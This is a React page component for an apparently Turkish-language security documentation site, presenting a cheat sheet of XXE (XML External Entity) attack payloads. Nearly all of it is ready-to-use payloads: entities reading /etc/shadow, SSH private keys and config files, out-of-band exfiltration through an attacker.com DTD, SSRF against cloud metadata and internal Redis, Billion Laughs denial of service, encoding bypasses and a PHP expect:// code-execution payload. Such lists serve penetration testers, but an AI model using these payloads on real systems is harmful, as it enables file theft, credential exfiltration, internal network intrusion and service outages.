"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "temel-xxe", title: "Temel XXE Payloadları", level: 2 },
  { id: "blind-xxe", title: "Blind XXE (Out-of-Band)", level: 2 },
  { id: "xxe-ssrf", title: "XXE to SSRF", level: 2 },
  { id: "dos", title: "DoS Payloadları", level: 2 },
  { id: "bypass", title: "Bypass Teknikleri", level: 2 },
  { id: "different-contexts", title: "XXE in Different Contexts", level: 2 },
]

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function XXEPage() {
  return (
    <>
    <TableOfContents items={tocItems} />
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">XXE (XML External Entity)</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          XML parser&apos;ların external entity&apos;leri işlemesini kullanarak dosya okuma, SSRF ve DoS saldırıları.
        </p>
      </motion.div>

      <Callout type="warning" title="Önemli">
        Modern XML parser&apos;lar varsayılan olarak external entity&apos;leri devre dışı bırakır. 
        Ancak eski sistemler ve yanlış yapılandırmalar hâlâ yaygındır.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="temel-xxe" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Temel XXE Payloadları</h2>
        <PayloadList
          title="File Read (Linux)"
          initialShow={8}
          payloads={[
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`, note: "Klasik file read - /etc/passwd" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<data>&xxe;</data>`, note: "Shadow file - root gerekir" },
            { code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`, note: "Tek satır XXE" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<foo>&xxe;</foo>`, note: "Environment variables" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
]>
<foo>&xxe;</foo>`, note: "Process command line" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
]>
<foo>&xxe;</foo>`, note: "SSH private key" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.bash_history">
]>
<foo>&xxe;</foo>`, note: "Bash history" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>`, note: "Web config dosyası" },
          ]}
        />

        <PayloadList
          title="File Read (Windows)"
          initialShow={5}
          payloads={[
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>`, note: "Windows win.ini" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>`, note: "Windows hosts file" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
]>
<foo>&xxe;</foo>`, note: "IIS web.config" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="blind-xxe" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Blind XXE (Out-of-Band)</h2>
        <PayloadList
          title="OOB XXE"
          initialShow={5}
          payloads={[
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>`, note: "Basit OOB - DNS/HTTP callback" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&send;</foo>`, note: "External DTD ile data exfiltration" },
            { code: `<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;`, note: "evil.dtd içeriği - data exfil" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
  %send;
]>
<foo>test</foo>`, note: "Parameter entity ile blind XXE" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://attacker.com:21/file">
]>
<foo>&xxe;</foo>`, note: "FTP ile data exfil" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="xxe-ssrf" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">XXE to SSRF</h2>
        <PayloadList
          title="SSRF via XXE"
          initialShow={5}
          payloads={[
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`, note: "AWS metadata via XXE" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<foo>&xxe;</foo>`, note: "Internal admin paneline erişim" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>`, note: "Internal network scan" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO">
]>
<foo>&xxe;</foo>`, note: "Gopher ile Redis" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="dos" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">DoS Payloadları</h2>
        <PayloadList
          title="Billion Laughs / Entity Expansion"
          initialShow={3}
          payloads={[
            { code: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>`, note: "Billion Laughs - memory exhaustion" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>`, note: "Infinite read DoS (Linux)" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/zero">
]>
<foo>&xxe;</foo>`, note: "Zero byte stream DoS" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Bypass Teknikleri</h2>
        <PayloadList
          title="XXE Bypass"
          initialShow={8}
          payloads={[
            { code: `<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`, note: "UTF-16 encoding" },
            { code: `<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-`, note: "UTF-7 encoding" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>`, note: "PHP filter ile base64 encoded output" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>`, note: "PHP expect wrapper - RCE" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
]>
<foo>&xxe;</foo>`, note: "Data URI scheme" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE :foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<:foo>&xxe;</:foo>`, note: "Namespace prefix trick" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
  "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>`, note: "PUBLIC identifier ile external DTD" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="different-contexts" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">XXE in Different Contexts</h2>
        <PayloadList
          title="Farklı Format XXE"
          initialShow={5}
          payloads={[
            { code: `<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
</svg>`, note: "SVG içinde XXE" },
            { code: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>`, note: "SOAP içinde XXE" },
            { code: `Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>`, note: "Content-Type XML olarak değiştir" },
            { code: `<!-- DOCX/XLSX/PPTX için -->
<!-- [Content_Types].xml içinde XXE enjekte et -->`, note: "Office dosyaları XML tabanlıdır" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test İpuçları">
        1. XML kabul eden tüm endpoint&apos;leri test edin
        2. Content-Type&apos;ı application/xml yaparak JSON&apos;ı XML&apos;e çevirin
        3. File upload&apos;larda SVG, DOCX, XLSX dosyaları deneyin
        4. Blind XXE için Burp Collaborator kullanın
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/web/ssrf" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>SSRF</span>
        </Link>
        <Link href="/docs/web/deserialization" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>Deserialization</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
    </>
  )
}
